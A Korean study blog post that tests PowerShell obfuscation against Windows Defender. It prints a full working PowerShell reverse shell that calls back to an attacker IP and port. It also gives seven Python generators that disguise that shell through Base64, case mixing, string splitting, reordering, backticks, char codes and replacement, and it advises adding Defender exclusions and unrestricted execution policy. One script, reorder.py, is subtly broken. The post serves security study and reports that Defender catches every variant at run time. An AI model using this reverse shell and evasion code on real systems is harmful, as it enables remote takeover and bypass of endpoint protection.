---
title: '[Study] PowerShell Obfuscation'
date: 2025-09-02 00:00:00
categories: [Study, Windows]
tags: []
published: True
---

# #Intro

공부를 하며 Linux 계열의 셸만을 주로 다루다보니 정작 윈도우의 셸인 PowerShell에 대해서는 잘 알지 못했고, PowerShell로 명령을 수행하는 것이 익숙하지 않아 매번 CLI 작업이 필요할 때에는 WSL2의 윈도우 마운트 드라이브로 넘어와 작업을 하곤 했다. 이번 기회를 통해 PowerShell을 맛보고, PowerShell의 난독화 기법에 대해 공부하며 Python 언어로 난독화 스크립트를 작성해보았다.

<br>

<br>

# #Reverse Shell in PowerShell

![image](/assets/posts/250902-2.png){: width="300" }

우선, 공격자 머신에서 nc 명령어로 리스닝을 수행하였다.

<br>

[https://www.revshells.com](https://www.revshells.com)

그 다음, 위의 사이트를 통해 공격자 머신의 IP 주소와 Port 번호를 값으로 하는 PowerShell의 리버스 셸 코드를 얻을 수 있었다.

```powershell
$LHOST = '192.168.195.20';
$LPORT = 4444;
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT);
$NetworkStream = $TCPClient.GetStream();
$StreamReader = New-Object IO.StreamReader($NetworkStream);
$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
$StreamWriter.AutoFlush = $true;
$Buffer = New-Object System.Byte[] 1024;
while ($TCPClient.Connected) {
    while ($NetworkStream.DataAvailable) {
        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length);
        $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1)
    };

    if ($TCPClient.Connected -and $Code.Length -gt 1) {
        $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ };
        $StreamWriter.Write("$Output`n");
        $Code = $null
    }
};
$TCPClient.Close();
$NetworkStream.Close();
$StreamReader.Close();
$StreamWriter.Close()
```

<br>

![image](/assets/posts/250902-1.png)

해당 코드를 Windows PowerShell ISE로 편집하여 저장하고, 리스닝 중인 공격자 머신의 IP 주소와 Port를 인자로 하여 리버스 셸 접속을 시도하였다.

<br>

> 이때, Windows Defender와 같은 보안 솔루션이 실행 중이라면, PowerShell 스크립트 실행이 차단될 수 있다. 이 경우에는 해당 솔루션에서 예외 처리를 해주어야 한다. (실습 환경에서는 Windows Defender가 실행 중이다.) 또한, PowerShell의 실행 정책이 제한적이라면, 아래 명령어로 프로세스 범위에서 실행 정책을 변경해주어야 한다.
> ```powershell
> Set-ExecutionPolicy Unrestricted
> ```

<br>

![image](/assets/posts/250902-3.png)

![image](/assets/posts/250902-4.png)

정상적으로 리스닝 중인 공격자 머신에서 PowerShell이 연결되는 것을 확인할 수 있다. 이제 해당 코드를 입력으로 하여 다양한 방법으로 난독화할 수 있는 python 스크립트를 작성해보고, 이를 통해 생성된 난독화된 PowerShell 코드를 실행하여 Windows Defender가 이를 탐지하는지 확인해보았다.

<br>

<br>

# #Obfuscation

## Base64 Encoding

리버스 셸 코드에 Base64 인코딩을 적용하고, 이를 PowerShell에서 제공하는 Base64 복호화 기능을 이용하여 복원한 후, `Invoke-Expression`을 통해 평가되어 실행될 수 있도록 하는 방법이다.

```python
# base64_.py

import base64

def base64_obfuscation(revshell_code):
    revshell_code = revshell_code.replace('\n', '')
    revshell_code = revshell_code.replace('\r', '')
    revshell_code = revshell_code.replace("'", '"')

    b64 = base64.b64encode(revshell_code.encode('utf-8')).decode('utf-8')
    obfuscated_code = f'[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{b64}")) | Invoke-Expression'

    return obfuscated_code

if __name__ == "__main__":
    with open('revshell.txt', 'r') as file:
        revshell_code = file.read()

        obfuscated_code = base64_obfuscation(revshell_code)

        print(obfuscated_code)

        with open('revshell.ps1', 'w') as file:
            file.write(obfuscated_code)
```

<br>

![image](/assets/posts/250902-13.png)

스크립트를 실행하면 터미널 창에서 정상적으로 난독화된 코드를 확인할 수 있으나, `.ps1` 파일이 생성됨과 동시에 Windows Defender에 의해 차단되는 것을 확인할 수 있다.

<br>

<br>

## Random Case

대소문자에 변화를 주는 난독화 방법이다. 예를 들어, `ReVeRsEsHeLl`과 같이 대소문자를 섞어서 작성하는 방법이다.

<br>

```python
# random_case.py

def random_case_obfuscation(revshell_code):
    revshell_code = revshell_code.replace('\n', '')
    revshell_code = revshell_code.replace('\r', '')
    revshell_code = revshell_code.replace(' ', '')
    revshell_code = revshell_code.lower()

    obfuscated_code = ""
    for index, char in enumerate(revshell_code):
        if index % 2 == 0:
            obfuscated_code += char.upper()
        else:
            obfuscated_code += char

    return obfuscated_code

if __name__ == "__main__":
    with open('revshell.txt', 'r') as file:
        revshell_code = file.read()

        obfuscated_code = random_case_obfuscation(revshell_code)

        print(obfuscated_code)

        with open('revshell.ps1', 'w') as file:
            file.write(obfuscated_code)
```

<br>

![image](/assets/posts/250902-14.png)

위의 코드로 대소문자가 섞인 난독화된 PowerShell Reverse Shell 코드를 생성할 수 있다. 그러나 이 방법도 파일이 생성됨과 동시에 Windows Defender에 의해 차단되는 것을 확인할 수 있다.

<br>
<br>

## Division/Whitespace

PowerShell에서 `'String' + 'String'` 형태로 문자열을 결합할 수 있고, 이를 이용하여 난독화된 코드를 생성할 수 있다. PowerShell에서 문자들이 결합하여 문자열을 이룰 수 있도록 싱글 쿼터와 더블 쿼터를 모두 하나로 맞춰주고, 문자열이 결합된 후에 이 식이 평가되어 실행될 수 있도록 `Invoke-Expression`을 이용한다.

<br>

```python
# division.py

def division_obfuscation(revshell_code):
    revshell_code = revshell_code.replace('\n', '')
    revshell_code = revshell_code.replace('\r', '')
    revshell_code = revshell_code.replace(' ', '')
    revshell_code = revshell_code.replace("'", '"')

    obfuscated_code = '$str='
    for index, char in enumerate(revshell_code):

        if index % 3 == 0:
            obfuscated_code += f"'{char}"
        elif index % 3 == 1:
            obfuscated_code += f"{char}'"
        else:
            obfuscated_code += f"+'{char}'+"

    if obfuscated_code.endswith("+"):
        obfuscated_code = obfuscated_code[:-1]

    obfuscated_code += ';Invoke-Expression $str'

    return obfuscated_code


if __name__ == "__main__":
    with open('revshell.txt', 'r') as file:
        revshell_code = file.read()

        obfuscated_code = division_obfuscation(revshell_code)

        print(obfuscated_code)

        with open('revshell.ps1', 'w') as file:
            file.write(obfuscated_code)
```

<br>

![image](/assets/posts/250902-5.png)

해당 코드를 실행하면, 이번에는 Windows Defender에 의해 차단되지 않고 정상적으로 `.ps1` 파일이 생성되는 것을 확인할 수 있다.

<br>

![image](/assets/posts/250902-6.png)

그러나, 생성된 `.ps1` 파일을 실행하면, 위와 같이 Windows Defender가 차단하는 것을 확인할 수 있다. 이는 이전 난독화 기법에서 파일 내의 코드 혹은 시그니처를 기반으로 악성코드를 탐지하는 것과 다르게, 파일 실행 시 동작하는 행위를 기반으로 악성코드를 탐지하는 것을 알 수 있다.

<br>
<br>

## Reorder

코드 문자열의 문자들을 섞음으로써 난독화된 코드를 생성할 수 있고, 이를 실행할 때에는 PowerShell에서 제공하는 `-f` 옵션을 통해 포맷팅된 문자열을 복원하여 사용할 수 있다. 포맷팅된 문자열은 `Invoke-Expression`을 통해 평가되어 실행될 수 있다.

<br>

```python
# reorder.py

import random

def reorder_obfuscation():
    revshell_code = revshell_code.replace('\n', '')
    revshell_code = revshell_code.replace('\r', '')
    revshell_code = revshell_code.replace(' ', '')
    revshell_code = revshell_code.replace("'", '"')

    indexed_chars = list(enumerate(revshell_code))
    random.shuffle(indexed_chars)
    new_chars = [(new_index, (old_index, char)) for new_index, (old_index, char) in enumerate(indexed_chars)]
    new_chars_sorted = sorted(new_chars, key=lambda x: x[1][0])

    shuffled_string = ''.join([f"'{char}'," for index, char in indexed_chars])
    shuffled_string = shuffled_string[:-1]

    shuffled_index = ''.join([f'{{{new_index}}}' for new_index, (old_index, char) in new_chars_sorted])
    shuffled_index = "'" + shuffled_index + "'"

    obfuscated_code = f'$str={shuffled_index}-f{shuffled_string};Invoke-Expression $str'

    return obfuscated_code

if __name__ == "__main__":
    with open('revshell.txt', 'r') as file:
        revshell_code = file.read()

        obfuscated_code = reorder_obfuscation(revshell_code)

        print(obfuscated_code)

        with open('revshell.ps1', 'w') as file:
            file.write(obfuscated_code)
```

<br>

![image](/assets/posts/250902-12.png)

스크립트를 실행하면 위와 같이 난독화된 코드를 확인할 수 있다.

<br>

![image](/assets/posts/250902-7.png)

난독화된 코드는 `Write-Output` 명령어를 통해 난독화된 코드가 정상적으로 복원되는 것을 확인할 수 있고, `.ps1` 파일 생성 시에도 Windows Defender에 의해 차단되지 않는 것을 확인할 수 있다. 그러나, 마찬가지로 해당 파일을 실행하면 Windows Defender에 의해 차단되는 것을 확인할 수 있다.

<br>
<br>


## Back Ticks

PowerShell에서 백틱(``` ` ```)은 이스케이프 문자로 사용되며, 이를 이용하여 난독화된 코드를 생성할 수 있다. 백틱을 이용하여 코드 내의 특수 문자를 이스케이프 처리함으로써, 코드가 정상적으로 평가되어 실행될 수 있도록 한다. 기본적인 셸 코드에 구조 상 backtick을 추가하기에 어려움이 있어, base64 인코딩을 거친 후에 backtick을 추가하는 방식으로 스크립트를 구성하였다.

<br>

```python
# back_ticks.py

import base64
import string


def back_ticks_obfuscation(revshell_code):
    revshell_code = revshell_code.replace('\n', '')
    revshell_code = revshell_code.replace('\r', '')
    revshell_code = revshell_code.replace("'", '"')

    obfuscated_code = ''
    for char in revshell_code:
        if char.lower() not in ['a', 'b', 'e', 'f', 'n', 'r', 't', 'v', 'u', ' ', '"', "'", '0'] and char in string.ascii_letters + string.digits:
            obfuscated_code += '`' + char
        else:
            obfuscated_code += char

    if obfuscated_code[0] == '`':
        obfuscated_code = obfuscated_code[1:]

    obfuscated_code = f"$str='{obfuscated_code}';Invoke-Expression $str;"

    return obfuscated_code


if __name__ == "__main__":
    with open('revshell.txt', 'r') as file:
        revshell_code = file.read()

        base64_revshell = base64.b64encode(revshell_code.encode()).decode()

        obfuscated_code = back_ticks_obfuscation(revshell_code)

        print(obfuscated_code)

        with open('revshell.ps1', 'w') as file:
            file.write(obfuscated_code)
```

<br>

PowerShell에서 지원하는 백틱 이스케이프 시퀀스는 `a`, `b`, `e`, `f`, `n`, `r`, `t`, `v`, `u`, ` `, `"`, `'`, `0` 이기에 해당 문자들을 제외하고 백틱을 추가하도록 하였다.

<br>

![image](/assets/posts/250902-15.png)

스크립트를 실행하면 위와 같이 backtick이 추가된 난독화 코드를 확인할 수 있다. 생성된 `.ps1` 파일은 backtick이 추가되었음에도 불구하고 파일이 생성되자 마자 Windows Defender에 의해 차단되는 것을 확인할 수 있다.

<br>
<br>

## Ascii char assigns

PowerShell에서는 `[char]ascii_code` 형식으로 ASCII 문자를 표현할 수 있다. 예를 들어, `[char]65`는 'A'를 의미한다. 이를 활용하여 난독화된 코드를 생성할 수 있다.

<br>

```python
# ascii_char_assigns.py

def ascii_char_assigns_obfuscation(revshell_code):
    revshell_code = revshell_code.replace('\n', '')
    revshell_code = revshell_code.replace('\r', '')
    revshell_code = revshell_code.replace("'", '"')

    obfuscated_code = ''
    for char in revshell_code:
        obfuscated_code += f"[char]{ord(char)}+"

    if obfuscated_code.endswith('+'):
        obfuscated_code = obfuscated_code[:-1]

    obfuscated_code = f"$str={obfuscated_code};Invoke-Expression $str"

    return obfuscated_code

if __name__ == "__main__":
    with open('revshell.txt', 'r') as file:
        revshell_code = file.read()

        obfuscated_code = ascii_char_assigns_obfuscation(revshell_code)

        print(obfuscated_code)

        with open('revshell.ps1', 'w') as file:
            file.write(obfuscated_code)
```

<br>

![image](/assets/posts/250902-11.png)

스크립트를 실행하면 위와 같이 난독화된 코드를 확인할 수 있다. 그러나, `.ps1` 파일은 정상적으로 생성되지만 실행 시에 Windows Defender에 의해 차단된다.

<br>
<br>

## Replace

PowerShell에서 제공하는 `.replace()` 메서드를 사용하여 특정 문자열을 다른 문자열로 대체하는 방식을 이용한 난독화 기법이다.

<br>

```python
# replace.py

import random
import string


def replace_obfuscation(revshell_code):

    revshell_code = revshell_code.replace('\n', '')
    revshell_code = revshell_code.replace('\r', '')
    revshell_code = revshell_code.replace("'", '"')

    printable = set(string.ascii_letters + string.digits + string.punctuation) - {'"', "'", '\\', '`'}
    used_chars = set(revshell_code)
    unused_chars_list = list(printable - used_chars)
    random.shuffle(unused_chars_list)
    replacement_map = {}

    for char in used_chars:
        if unused_chars_list:
            new_char = unused_chars_list.pop(0)
            replacement_map[char] = new_char

    obfuscated_code = revshell_code
    for original_char, new_char in replacement_map.items():
        obfuscated_code = obfuscated_code.replace(original_char, new_char)

    restore_map = {new_char: original_char for original_char, new_char in replacement_map.items()}

    restore_commands = []
    for obfuscated_char, original_char in restore_map.items():
        restore_commands.append(f"$str=$str.Replace('{obfuscated_char}','{original_char}')")

    final_obfuscated_code = f"$str='{obfuscated_code}';"
    for cmd in restore_commands:
        final_obfuscated_code += cmd + ";"
    final_obfuscated_code += "Invoke-Expression $str"

    return final_obfuscated_code

if __name__ == "__main__":
    with open('revshell.txt', 'r') as file:
        revshell_code = file.read()

        final_obfuscated_code = replace_obfuscation(revshell_code)

        print(final_obfuscated_code)

        with open('revshell.ps1', 'w') as file:
            file.write(final_obfuscated_code)
```

<br>

![image](/assets/posts/250902-10.png)

스크립트를 실행하면, 위와 같이 난독화된 코드를 확인할 수 있다. `.ps1` 파일은 정상적으로 생성되나, 실행 시에 Windows Defender에 의해 차단되는 것을 확인할 수 있다.

<br>

<br>

# #Conclusion

| 난독화 기법 | 탐지 여부 (파일 생성 시) | 탐지 여부 (파일 실행 시) |
|-------------|-------------------------|-------------------------|
| Base64 Encoding | O | O |
| Random Case | O | O |
| Division/Whitespace | X | O |
| Reorder | X | O |
| Back Ticks | O | O |
| Ascii char assigns | X | O |
| Replace | X | O |
| |
| **O**: 탐지됨, **X**: 탐지되지 않음 |
| Windows Defender 보안 인텔리전스 버전: 1.435.549.0 |

<br>

PowerShell 난독화 기법을 통해 생성된 `.ps1` 파일이 Windows Defender에 의해 탐지되는지 여부를 확인해본 결과, 파일 생성 시점에서는 일부 기법에서 탐지되지 않는 것을 확인할 수 있었으나, 파일 실행 시점에서 모두 탐지되는 것을 확인할 수 있었다. 이는 Windows Defender가 단순히 코드의 형태나 시그니처뿐만 아니라, 코드의 행위와 실행 패턴을 분석하여 악성코드를 탐지하는 능력을 갖추고 있음을 알 수 있었다.

<br>

<br>

> **Reference**
>
> [https://www.igloo.co.kr/security-information/powershell-%EB%82%9C%EB%8F%85%ED%99%94-%EB%B6%84%EC%84%9D-%EB%B0%8F-%EB%B3%B5%ED%98%B8%ED%99%94/](https://www.igloo.co.kr/security-information/powershell-%EB%82%9C%EB%8F%85%ED%99%94-%EB%B6%84%EC%84%9D-%EB%B0%8F-%EB%B3%B5%ED%98%B8%ED%99%94/)
{: .prompt-info }
